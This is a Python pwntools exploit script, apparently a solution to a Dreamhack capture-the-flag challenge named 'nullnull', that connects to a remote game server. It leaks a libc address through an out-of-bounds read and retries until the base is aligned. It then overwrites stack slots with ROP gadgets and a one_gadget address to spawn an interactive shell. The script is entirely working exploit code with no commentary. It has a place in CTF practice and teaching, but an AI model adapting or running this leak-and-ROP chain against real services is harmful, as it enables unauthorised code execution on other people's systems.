from pwn import *
import struct

e = ELF('./nullnull_patched')
libc = e.libc

def read(idx):
    log.info(f'read({idx=})')
    p.sendline(b'3')
    p.sendline(str(idx).encode())

def write(idx, val):
    log.info(f'write({idx=}, {val=})')
    p.sendline(b'2')
    p.sendline(str(idx).encode())
    p.sendline(str(val).encode())

def echo(val):
    log.info(f'echo({val=})')
    p.sendline(b'1')
    p.sendline(val)

def re():
    log.info(f're()')
    p.sendline(b'0')

def out():
    log.info(f'out()')
    p.sendline(b'-1')

while 1:
    # p = e.process()
    p= remote('host1.dreamhack.games', 21946)

    echo(b'1'*80)
    p.recvline()

    read(37)
    try:base = int(struct.pack(">q",int(p.recvline())).hex(),16)
    except EOFError:
        p.close()
        continue
    if base==0:
        p.close()
        continue
    base -= libc.symbols['__libc_start_main'] + 0xf3
    if base&0xFF!=0:
        p.close()
        continue

    print(hex(base))
    rdx_r12 = 0x0000000000119241 + base
    rsi = 0x000000000002604f + base
    oneshot = 0xe3d29 + base

    write(3, rdx_r12)
    write(4, 0)
    write(5, 0)
    write(6, rsi)
    write(7, 0)
    write(8, oneshot)

    re()

    p.interactive()
    break
